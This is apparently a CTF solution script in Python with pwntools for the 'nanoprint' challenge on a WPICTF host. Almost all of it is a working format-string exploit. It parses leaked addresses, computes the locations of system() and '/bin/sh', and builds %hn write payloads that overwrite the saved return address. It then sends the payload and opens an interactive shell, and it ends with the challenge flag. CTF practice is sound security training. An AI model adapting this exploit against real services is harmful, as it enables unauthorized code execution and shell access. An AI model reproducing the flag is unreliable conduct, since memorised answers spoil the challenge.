from pwn import *

# context.log_level = "DEBUG"

LOCAL = False
DEBUG = False

context.update(arch='i386', os='linux')

e = ELF("./nanoprint")
l = ELF("./libc.so.6")

if LOCAL:
    p = process(e.path)
else:
    host = "dorsia3.wpictf.xyz"
    port = 31339
    p = remote(host, port)
    
if DEBUG:
    context.terminal = ['tmux', 'splitw', '-h']
    gdb.attach(p, "b *0x565560c7") # before second printf() "b *0x565560c7"
    # ret: 0x565560d9 
    
leak = p.recvuntil("\n", drop=True)

leak_a = int(leak[:10], 16)
leak_system = int(leak[10:], 16) + 288
if LOCAL:
    leak_binsh = leak_system + 1305535
else:
    # /bin/sh: 0x17e0cf
    leak_binsh = leak_system + 0x140ecf

log.critical("addr of a[]: {0}".format(hex(leak_a)))
log.critical("addr of system(): {0}".format(hex(leak_system)))
log.critical("addr of str_bin_sh: {0}".format(hex(leak_binsh)))

# esp before calling second printf: 0x*a0
# a[]: 0x*bb
# return address is at: 0x*12c
# example payload: aaaaa%9$nAAAABBBBCCCCDDDD, this write 0x5 to 0x41414141

# example legitimate return address: 0xf7dffe81
# how to change this value to 0xf7e23d10?

ret_addr = leak_a + (0x12c - 0xbb)
log.critical("return addr should be at: {0}".format(hex(ret_addr)))
log.critical("bin_sh should be at: {0}".format(hex(ret_addr + 8)))

s1 = leak_system & 0xffff
s2 = (leak_system >> 16) & 0xffff
b1 = leak_binsh & 0xffff
b2 = (leak_binsh >> 16) & 0xffff

q = list()
q.append((s1, ret_addr))
q.append((s2, ret_addr + 2))
q.append((b1, ret_addr + 8))
q.append((b2, ret_addr + 10))

q.sort()
for i in range(len(q)):
    if i != (len(q) - 1):
        assert(q[i+1][0] - q[i][0] >= 4)
    success("write {0} to {1}".format(hex(q[i][0]), hex(q[i][1])))

payload  = b'a'
payload += p32(q[0][1])
payload += p32(q[1][1])
payload += p32(q[2][1])
payload += p32(q[3][1])

num = len(payload)
success("length of payload so far: {0}".format(num))

a1 = 7
a2 = 8
a3 = 9
a4 = 10

payload += b'%' + str(q[0][0] - num).encode() + b'c'
payload += b'%' + str(a1).encode() + b'$hn'
num = q[0][0]

payload += b'%' + str(q[1][0] - num).encode() + b'c'
payload += b'%' + str(a2).encode() + b'$hn'
num = q[1][0]

payload += b'%' + str(q[2][0] - num).encode() + b'c'
payload += b'%' + str(a3).encode() + b'$hn'
num = q[2][0]

payload += b'%' + str(q[3][0] - num).encode() + b'c'
payload += b'%' + str(a4).encode() + b'$hn'

success(payload)
success("length of entire payload: {0}".format(len(payload)))
assert(len(payload) < 69)

if DEBUG:
    print("R U ready?")
    input()

p.sendline(payload)
#p.recvline()
p.interactive()

# WPI{Th3re_is_an_idea_of_4_Pa7rick_BatemaN}